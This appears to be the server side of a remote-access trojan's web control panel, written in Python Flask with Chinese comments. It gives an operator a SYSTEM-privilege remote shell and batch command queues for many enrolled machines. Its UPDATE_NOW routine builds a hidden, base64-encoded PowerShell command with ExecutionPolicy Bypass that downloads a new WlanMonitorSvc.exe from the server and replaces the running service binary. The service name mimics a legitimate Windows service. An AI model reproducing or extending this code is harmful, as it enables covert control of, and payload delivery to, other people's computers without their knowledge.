from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue

bp = Blueprint('terminal', __name__)

@bp.route('/terminal/<mac>')
def terminal_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "设备不存在"
    
    TERMINAL_HTML = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>终端 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #000; color: #00ff00; font-family: Consolas, monospace; padding: 10px; margin: 0; }
            #output { font-family: Consolas; white-space: pre-wrap; word-wrap: break-word; padding-bottom: 40px; }
            .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; display: flex; flex-direction: column; }
            .header a { color: #aaa; text-decoration: none; margin-top: 5px; }
            .header a:hover { color: #fff; }
            .input-area { display: flex; flex-wrap: wrap; position: fixed; bottom: 0; left: 0; right: 0; background: #111; padding: 10px; border-top: 1px solid #333; }
            .input-area span { width: 100%; padding-bottom: 5px; box-sizing: border-box; font-size: 12px; }
            .input-area input { flex-grow: 1; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: Consolas; outline: none; min-width: 180px; }
            .input-area button { background: #00ff00; color: #000; font-weight: bold; border: none; padding: 8px 15px; cursor: pointer; margin-left: 5px; margin-top: 5px;}
            .input-area button:hover { background: #00cc00; }
            .sys-msg { color: #888; }
        </style>
    </head>
    <body>
        <div class="header">
            <span>>_ {{ info.name }}  [{{ mac }}] 的安全终端交互界面 (SYSTEM权限) <span id="conn_status"></span></span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div id="output"><span class="sys-msg">正在链接受控端，获取最后输出缓冲...</span></div>
        <br><br><br>
        <div class="input-area">
            <span style="color:#aaa;">root@{{ info.name }}:~#</span>
            <div style="display:flex; width: 100%;">
                <input type="text" id="cmd" placeholder="输入命令..." onkeydown="if(event.keyCode==13) sendCmd()">
                <button onclick="sendCmd()">发送</button>
                <button onclick="window.location.href='/'" style="background:#6c757d; color:#fff;">返回</button>
            </div>
        </div>

        <script>
            function checkPing() {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('conn_status');
                    if(data.status === 'online') {
                        st.innerHTML = '🟢 实时设备在线';
                        st.style.color = '#28a745';
                    } else {
                        st.innerHTML = '🔴 设备疑似掉线';
                        st.style.color = 'red';
                    }
                });
            }
            setInterval(checkPing, 3000);
            checkPing();

            function fetchOutput() {
                fetch('/api/get_cmd_result/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    if(data.status === 'ok') {
                        var el = document.getElementById('output');
                        if (el.textContent !== data.output) {
                            var isScrolledToBottom = (window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 50);
                            el.textContent = data.output;
                            if (isScrolledToBottom) {
                                window.scrollTo(0, document.body.scrollHeight);
                            }
                        }
                    }
                });
            }
            setInterval(fetchOutput, 500);
            fetchOutput();

            function sendCmd() {
                var cmd = document.getElementById('cmd').value;
                if(!cmd) return;
                document.getElementById('cmd').value = '';

                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(() => fetchOutput()); // 发送后直接立即拉取渲染一下执行状态
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(TERMINAL_HTML, mac=mac, info=clients_db[mac])

@bp.route('/cmd_result', methods=['POST'])
def cmd_result():
    mac = decrypt_data(request.form.get('mac', ''))
    output = decrypt_data(request.form.get('output', ''))
    if mac in clients_db:
        # 将最新的结果自动往后追加到这段历史记录里，并且截断过长的历史以节省空间
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"{output}\n")[-50000:];
        clients_db[mac]['is_executing'] = False;
        save_db()
    return "OK", 200

@bp.route('/api/send_cmd', methods=['POST'])
def api_send_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')

    if mac not in clients_db:
        return jsonify({"status": "error", "msg": "设备不存在"}), 404

    # 初始化该客户端的队列
    init_client_queue(mac)

    # 确定命令优先级（娱乐命令用 'normal'，重要命令用 'high'）
    priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'

    # 处理 UPDATE_NOW 特殊逻辑
    if cmd == 'UPDATE_NOW':
        import base64
        host_url = request.host_url.rstrip('/')
        def get_version(v_str):
            try: return [int(x) for x in v_str.strip().split('.')]
            except: return [0, 0, 0]
        client_ver = clients_db[mac].get('ver', '1.0.0')
        if get_version(client_ver) < [1, 6, 10]:
            ps_cmd = (
                "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                "if (-not $p) { exit }; "
                f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
            )
            ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
            cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
        priority = 'high'

    # 使用命令队列进行投递（返回布尔值表示是否成功入队）
    success = add_cmd_to_queue(mac, cmd, priority=priority)

    if not success:
        return jsonify({"status": "error", "msg": "命令队列已满，请稍后重试"}), 429

    # 记录到终端历史（用于展示）
    name = clients_db[mac].get('name', '未命名设备')
    clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
    clients_db[mac]['is_executing'] = True
    save_db()

    return jsonify({"status": "ok", "msg": "命令已入队，等待设备执行"})


@bp.route('/api/batch_cmd', methods=['POST'])
def api_batch_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    macs = data.get('macs', [])
    cmd = data.get('cmd', '')
    import base64
    host_url = request.host_url.rstrip('/')
    def get_version(v_str):
        try: return [int(x) for x in v_str.strip().split('.')]
        except: return [0, 0, 0]

    failed_macs = []
    for mac in macs:
        if mac not in clients_db:
            failed_macs.append(mac)
            continue

        init_client_queue(mac)

        # 确定命令优先级
        priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'

        # 处理 UPDATE_NOW 特殊逻辑
        final_cmd = cmd
        if cmd == 'UPDATE_NOW':
            client_ver = clients_db[mac].get('ver', '1.0.0')
            if get_version(client_ver) < [1, 6, 10]:
                ps_cmd = (
                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                    "if (-not $p) { exit }; "
                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
                )
                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
                final_cmd = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
            priority = 'high'

        # 入队
        if not add_cmd_to_queue(mac, final_cmd, priority=priority):
            failed_macs.append(mac)
            continue

        name = clients_db[mac].get('name', '未命名设备')
        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {final_cmd}\n")[-50000:]
        clients_db[mac]['is_executing'] = True

    save_db()

    if failed_macs:
        return jsonify({"status": "partial", "msg": f"部分设备入队失败: {', '.join(failed_macs)}", "failed": failed_macs}), 207
    return jsonify({"status": "ok", "msg": "所有命令已入队"})


@bp.route('/api/get_cmd_result/<mac>')
def api_get_cmd_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        hist = clients_db[mac].get('terminal_history', '尚未有历史执行记录\n')
        if clients_db[mac].get('is_executing', False):
            hist += "[系统指令已下发，等待终端执行与响应返回...] \n";
        return jsonify({"output": hist, "status": "ok"})
    return jsonify({"status": "not found"})
